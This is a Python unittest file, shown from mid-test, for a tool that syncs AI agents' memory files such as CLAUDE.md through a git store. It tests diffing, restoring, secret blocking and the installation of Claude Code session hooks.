        [d] = s.diff()
        self.assertEqual((d.sat, d.rel), (sid, "CLAUDE.md"))
        self.assertIn(f"--- store/{sid}/CLAUDE.md", d.text)
        self.assertIn(f"+++ local/{sid}/CLAUDE.md", d.text)
        self.assertIn("-two\n", d.text)
        self.assertIn("+2\n", d.text)
        code, out, _ = self.run_cli("diff", sid, "CLAUDE.md")
        self.assertEqual(code, 1)
        self.assertIn("+2", out)

    def test_missing_final_newline_is_marked(self):
        s, p, sid = self.setup_store()
        (p / "CLAUDE.md").write_text("one\ntwo")
        [d] = s.diff()
        self.assertTrue(d.text.endswith("-two\n+two\n\\ No newline at end of file\n"), d.text)

    def test_line_ending_only_change_is_named(self):
        s, p, sid = self.setup_store()
        (p / "CLAUDE.md").write_bytes(b"one\r\ntwo\r\n")
        [d] = s.diff()
        self.assertEqual(d.text, f"{sid}/CLAUDE.md: only line endings differ (store LF, local CRLF)\n")

    def test_files_on_one_side_only(self):
        s, p, sid = self.setup_store()
        (p / "AGENTS.md").write_text("new here\n")
        (s.records / sid / "napkin.md").write_text("from elsewhere\n")
        s.commit("other machine")
        by_rel = {d.rel: d.text for d in s.diff([sid])}
        self.assertEqual(sorted(by_rel), ["AGENTS.md", "napkin.md"])
        self.assertIn("--- /dev/null", by_rel["AGENTS.md"])
        self.assertIn("+new here", by_rel["AGENTS.md"])
        self.assertIn("+++ /dev/null", by_rel["napkin.md"])
        self.assertIn("-from elsewhere", by_rel["napkin.md"])
        self.assertEqual([d.rel for d in s.diff([sid], "napkin.md")], ["napkin.md"])

    def test_help_documents_exit_code(self):
        from contextlib import redirect_stdout
        from io import StringIO
        out = StringIO()
        with redirect_stdout(out), self.assertRaises(SystemExit):
            cli.main(["diff", "--help"])
        self.assertIn("exit 1 if they do", " ".join(out.getvalue().split()))

    def test_track_counts_files_in_words(self):
        Store(self.tmp / "s").init(track_global=False)
        one = self.project("one")
        (one / "CLAUDE.md").write_text("x\n")
        two = self.project("two", remote="git@github.com:me/two.git")
        (two / "CLAUDE.md").write_text("x\n")
        (two / "AGENTS.md").write_text("y\n")
        _, out, _ = self.run_cli("track", str(one))
        self.assertIn("(1 memory file)", out)
        _, out, _ = self.run_cli("track", str(two))
        self.assertIn("(2 memory files)", out)

    def test_bad_arguments(self):
        s, p, sid = self.setup_store()
        code, _, err = self.run_cli("diff", "github.com/nope/nope")
        self.assertEqual(code, 2)
        self.assertIn("not tracked", err)
        code, _, err = self.run_cli("diff", sid, "README.md")
        self.assertEqual(code, 2)
        self.assertIn("not a memory", err)

    @unittest.skipUnless(can_symlink(), "symlinks not supported here")
    def test_link_difference_shown(self):
        s, p, sid = self.setup_store()
        os.symlink("CLAUDE.md", p / "AGENTS.md")
        [d] = s.diff()
        self.assertEqual(d.rel, "AGENTS.md")
        self.assertIn("symlink", d.text)
        self.assertIn("store: (none)", d.text)
        self.assertIn("local: -> CLAUDE.md", d.text)

    def test_tampered_record_never_reads_local_file(self):
        s, p, sid = self.setup_store()
        (p / "run.sh").write_text("local secret script\n")
        (s.records / sid / "run.sh").write_text("x\n")
        s.commit("tampered")
        self.assertEqual(s.diff(), [])

    def test_conflict_message_points_to_diff(self):
        s, p, sid = self.setup_store()
        (s.records / sid / "CLAUDE.md").write_text("store v2\n")
        s.commit("other machine")
        (p / "CLAUDE.md").write_text("local v2\n")
        code, out, err = self.run_cli("restore")
        self.assertEqual(code, 1)
        self.assertIn(f"punk diff {sid} CLAUDE.md", err)


class TestHooks(Base):
    def setUp(self):
        super().setUp()
        self.store = Store(self.tmp / "s")
        self.store.init(track_global=False)
        self.settings = Path(os.environ["HOME"]) / ".claude" / "settings.json"

    def cli(self, *args, stdin=""):
        from contextlib import redirect_stderr, redirect_stdout
        from io import StringIO
        out, err = StringIO(), StringIO()
        old = sys.stdin
        sys.stdin = StringIO(stdin)
        try:
            with redirect_stdout(out), redirect_stderr(err):
                code = cli.main(["--home", str(self.store.root), *args])
        finally:
            sys.stdin = old
        return code, out.getvalue(), err.getvalue()

    def ours(self, settings):
        return [(event, g.get("matcher"), h["args"][-1]) for event, groups in settings.get("hooks", {}).items()
                for g in groups for h in g["hooks"] if "punk_records" in h.get("args", [])]

    def test_install_merges_and_is_idempotent(self):
        self.settings.parent.mkdir(parents=True)
        mine = {"type": "command", "command": "echo hi"}
        self.settings.write_text(json.dumps({"permissions": {"allow": ["Bash(ls)"]},
                                             "hooks": {"SessionStart": [{"matcher": "startup", "hooks": [mine]}]}}))
        code, out, _ = self.cli("install-hooks")
        self.assertEqual(code, 0, out)
        self.assertIn("installed", out)
        data = json.loads(self.settings.read_text())
        self.assertEqual(data["permissions"], {"allow": ["Bash(ls)"]})
        self.assertEqual(data["hooks"]["SessionStart"][0], {"matcher": "startup", "hooks": [mine]})
        self.assertEqual(self.ours(data), [("SessionStart", "startup|resume", "session-start"),
                                           ("SessionEnd", None, "session-end")])
        h = data["hooks"]["SessionEnd"][-1]["hooks"][0]
        self.assertEqual(h["command"], sys.executable)
        self.assertEqual(h["args"], ["-m", "punk_records", "--home", str(self.store.root.resolve()), "hook",
                                     "session-end"])
        self.assertEqual(h["timeout"], 30)
        self.assertTrue((self.settings.parent / "settings.json.punk-bak").is_file())
        before = self.settings.read_bytes()
        code, out, _ = self.cli("install-hooks")
        self.assertIn("already installed", out)
        self.assertEqual(self.settings.read_bytes(), before)

    def test_uninstall_removes_only_ours(self):
        self.settings.parent.mkdir(parents=True)
        mine = {"type": "command", "command": "echo bye"}
        self.settings.write_text(json.dumps({"hooks": {"SessionEnd": [{"hooks": [mine]}]}, "model": "x"}))
        self.cli("install-hooks")
        code, out, _ = self.cli("install-hooks", "--uninstall")
        self.assertEqual(code, 0)
        self.assertIn("removed", out)
        self.assertEqual(json.loads(self.settings.read_text()),
                         {"hooks": {"SessionEnd": [{"hooks": [mine]}]}, "model": "x"})
        self.cli("install-hooks")
        self.settings.write_text(json.dumps({"hooks": {"SessionStart": json.loads(
            self.settings.read_text())["hooks"]["SessionStart"][-1:]}}))
        self.cli("install-hooks", "--uninstall")
        self.assertEqual(json.loads(self.settings.read_text()), {})  # empty containers dropped

    def test_invalid_settings_are_never_overwritten(self):
        self.settings.parent.mkdir(parents=True)
        self.settings.write_text("{ not json")
        code, _, err = self.cli("install-hooks")
        self.assertEqual(code, 2)
        self.assertIn("not valid JSON", err)
        self.assertEqual(self.settings.read_text(), "{ not json")
        self.settings.write_text(json.dumps({"hooks": []}))
        self.assertEqual(self.cli("install-hooks")[0], 2)
        self.assertEqual(json.loads(self.settings.read_text()), {"hooks": []})

    def test_project_scope_uses_local_settings(self):
        p = self.project("app")
        code, out, _ = self.cli("install-hooks", "--project", str(p))
        self.assertEqual(code, 0)
        target = p / ".claude" / "settings.local.json"
        self.assertIn(str(target), out)
        self.assertIn(".gitignore", out)  # not ignored yet: tell the user
        self.assertEqual(len(self.ours(json.loads(target.read_text()))), 2)
        self.assertFalse(self.settings.exists())

    def test_dry_run_writes_nothing(self):
        code, out, _ = self.cli("install-hooks", "--dry-run")
        self.assertEqual(code, 0)
        self.assertFalse(self.settings.exists())

    def test_session_start_restores_quietly(self):
        p = self.project("app")
        (p / "CLAUDE.md").write_text("v1\n")
        sid = self.store.track(p)
        self.store.save()
        (self.store.records / sid / "CLAUDE.md").write_text("v2 from another machine\n")
        self.store.commit("other machine")
        code, out, err = self.cli("hook", "session-start", stdin=json.dumps({"cwd": str(p / "sub")}))
        self.assertEqual((code, out), (0, ""))  # stdout would be added to Claude's context
        self.assertEqual((p / "CLAUDE.md").read_text(), "v2 from another machine\n")

    def test_session_start_reports_conflicts_to_the_user(self):
        p = self.project("app")
        (p / "CLAUDE.md").write_text("v1\n")
        sid = self.store.track(p)
        self.store.save()
        (self.store.records / sid / "CLAUDE.md").write_text("store v2\n")
        self.store.commit("other machine")
        (p / "CLAUDE.md").write_text("local v2\n")
        code, out, _ = self.cli("hook", "session-start", stdin=json.dumps({"cwd": str(p)}))
        self.assertEqual(code, 0)
        msg = json.loads(out)["systemMessage"]
        self.assertIn("conflict", msg)
        self.assertIn("punk diff", msg)
        self.assertEqual((p / "CLAUDE.md").read_text(), "local v2\n")

    def test_session_end_saves_and_pushes(self):
        remote = self.tmp / "remote.git"
        git("init", "-q", "--bare", str(remote), cwd=self.tmp)
        git("remote", "add", "origin", str(remote), cwd=self.store.root)
        p = self.project("app")
        (p / "CLAUDE.md").write_text("learned something\n")
        sid = self.store.track(p)
        other = self.project("other", remote="git@github.com:me/other.git")
        (other / "CLAUDE.md").write_text("not this one\n")
        self.store.track(other)
        code, out, err = self.cli("hook", "session-end", stdin=json.dumps({"cwd": str(p), "reason": "other"}))
        self.assertEqual(code, 0, err)
        self.assertEqual((self.store.records / sid / "CLAUDE.md").read_text(), "learned something\n")
        self.assertFalse((self.store.records / "github.com/me/other").exists())  # only this session's project
        pushed = subprocess.run(["git", "--git-dir", str(remote), "show", f"main:records/{sid}/CLAUDE.md"],
                                capture_output=True, text=True).stdout
        self.assertEqual(pushed, "learned something\n")

    def test_session_end_shows_blocked_secrets_on_exit(self):
        p = self.project("app")
        (p / "CLAUDE.md").write_text("token ghp_" + "a" * 36 + "\n")
        self.store.track(p)
        code, _, err = self.cli("hook", "session-end", stdin=json.dumps({"cwd": str(p)}))
        self.assertEqual(code, 2)  # exit 2: stderr is shown to the user
        self.assertIn("blocked", err)

    def test_hooks_never_break_a_session(self):
        p = self.project("app")
        (p / "CLAUDE.md").write_text("x\n")
        # untracked project, no global satellite: nothing to do
        self.assertEqual(self.cli("hook", "session-start", stdin=json.dumps({"cwd": str(p)})), (0, "", ""))
        # unreachable remote: still restores locally, says so to the user only
        sid = self.store.track(p)
        self.store.save()
        git("remote", "add", "origin", str(self.tmp / "missing.git"), cwd=self.store.root)
        (self.store.records / sid / "CLAUDE.md").write_text("y\n")
        self.store.commit("other machine")
        code, out, _ = self.cli("hook", "session-start", stdin=json.dumps({"cwd": str(p)}))
        self.assertEqual(code, 0)
        self.assertIn("could not reach", json.loads(out)["systemMessage"])
        self.assertEqual((p / "CLAUDE.md").read_text(), "y\n")
        # no store at all, bad stdin
        code = subprocess.run([sys.executable, "-m", "punk_records", "--home", str(self.tmp / "none"),
                               "hook", "session-start"], input=b"not json", capture_output=True,
                              env={**os.environ, "PYTHONPATH": str(ROOT / "src")}).returncode
        self.assertEqual(code, 0)

    def test_unexpected_errors_are_reported_not_raised(self):
        p = self.project("app")
        self.store.track(p)
        self.store.state_path.write_text("{ corrupted")  # load_state raises a plain ValueError
        code, out, _ = self.cli("hook", "session-start", stdin=json.dumps({"cwd": str(p)}))
        self.assertEqual(code, 0)
        self.assertIn("hook session-start failed", json.loads(out)["systemMessage"])
        code, _, err = self.cli("hook", "session-end", stdin=json.dumps({"cwd": str(p)}))
        self.assertEqual(code, 2)
        self.assertIn("hook session-end failed", err)

    def test_warns_when_hook_python_cannot_import_punk(self):
        from unittest import mock

        from punk_records import hooks
        with mock.patch.object(hooks, "runnable", return_value=False):
            code, _, err = self.cli("install-hooks")
        self.assertEqual(code, 0)
        self.assertIn("cannot import punk_records without PYTHONPATH", err)
        self.cli("install-hooks", "--uninstall")
        with mock.patch.object(hooks, "runnable", return_value=True):
            self.assertEqual(self.cli("install-hooks")[2], "")

    def test_installed_command_runs_as_written(self):
        """Run the exact exec-form command from settings.json, like Claude Code does (no shell)."""
        p = self.project("app")
        (p / "CLAUDE.md").write_text("v1\n")
        sid = self.store.track(p)
        self.store.save()
        (self.store.records / sid / "CLAUDE.md").write_text("v2\n")
        self.store.commit("other machine")
        self.cli("install-hooks")
        h = json.loads(self.settings.read_text())["hooks"]["SessionStart"][-1]["hooks"][0]
        r = subprocess.run([h["command"], *h["args"]], input=json.dumps({"cwd": str(p)}).encode(),
                           capture_output=True, env={**os.environ, "PYTHONPATH": str(ROOT / "src")})
        self.assertEqual((r.returncode, r.stdout), (0, b""), r.stderr)
        self.assertEqual((p / "CLAUDE.md").read_text(), "v2\n")


if __name__ == "__main__":
    unittest.main()
